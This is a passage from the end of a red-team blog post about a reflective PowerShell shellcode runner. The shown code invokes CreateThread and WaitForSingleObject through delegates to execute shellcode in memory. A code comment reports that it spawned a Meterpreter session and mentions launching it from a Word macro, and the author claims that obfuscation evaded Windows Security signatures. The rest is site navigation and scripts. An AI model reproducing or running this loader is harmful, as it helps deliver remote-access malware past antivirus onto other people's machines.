</span><span class="nv">$hThread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="n">LookupFunc</span><span class="w"> </span><span class="nx">kernel32.dll</span><span class="w"> </span><span class="nx">CreateThread</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="n">getDelegateType</span><span class="w"> </span><span class="p">@([</span><span class="n">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">])</span><span class="w"> </span><span class="p">([</span><span class="n">IntPtr</span><span class="p">])))</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">([</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$lpMem</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="nx">0</span><span class="p">,[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">)</span><span class="w">

</span><span class="c"># During testing, after setting preparing $hThread variable, the Meterpreter session was spawned automatically if code executed directly in Windows PowerShell ISE. The code below might be needed if this PowerShell code was called let's say from macro of Microsoft Word process.</span><span class="w">

</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="n">LookupFunc</span><span class="w"> </span><span class="nx">kernel32.dll</span><span class="w"> </span><span class="nx">WaitForSingleObject</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="n">getDelegateType</span><span class="w"> </span><span class="p">@([</span><span class="n">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">Int32</span><span class="p">])</span><span class="w"> </span><span class="p">([</span><span class="n">Int</span><span class="p">])))</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="nv">$hThread</span><span class="p">,</span><span class="w"> </span><span class="nx">0xFFFFFFFF</span><span class="p">)</span><span class="w">

</span></pre></td></tr></tbody></table></code></div></div>

<p>Through code obfuscation, I was able to evade the latest Windows Security signatures and achieve in-memory execution of Meterpreter shellcode as shown below:</p>

<p><a href="https://i.imgur.com/9zzkyNi.png" class="popup img-link shimmer"><img src="https://i.imgur.com/9zzkyNi.png" alt="Bypass" loading="lazy"></a></p>

<p>Thanks for reading — on to the next challenge.</p>

<hr />

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/redteam/">REDTEAM</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/powershell/"
            class="post-tag no-text-decoration"
          >powershell</a>
        
          <a
            href="/tags/shellcode/"
            class="post-tag no-text-decoration"
          >shellcode</a>
        
          <a
            href="/tags/reflection/"
            class="post-tag no-text-decoration"
          >reflection</a>
        
          <a
            href="/tags/winapi/"
            class="post-tag no-text-decoration"
          >winapi</a>
        
          <a
            href="/tags/evasion/"
            class="post-tag no-text-decoration"
          >evasion</a>
        
          <a
            href="/tags/meterpreter/"
            class="post-tag no-text-decoration"
          >meterpreter</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/ref-she-run-pwsh/">Reflective shellcode runner in PowerShell</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/evasion/">evasion</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/meterpreter/">meterpreter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/reflection/">reflection</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/shellcode/">shellcode</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/winapi/">winapi</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  
    











            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Older">
      <p>-</p>
    </div>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- Buy Me a Coffee Widget (Gray Style) -->
<script data-name="BMC-Widget" data-cfasync="false" 
  src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" 
  data-id="1nnxrmxst" 
  data-description="Support me on Buy me a coffee!" 
  data-message="" 
  data-color="#808080" 
  data-position="Right" 
  data-x_margin="18" 
  data-y_margin="18">
</script>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/evasion/">evasion</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/meterpreter/">meterpreter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/reflection/">reflection</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/shellcode/">shellcode</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/winapi/">winapi</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

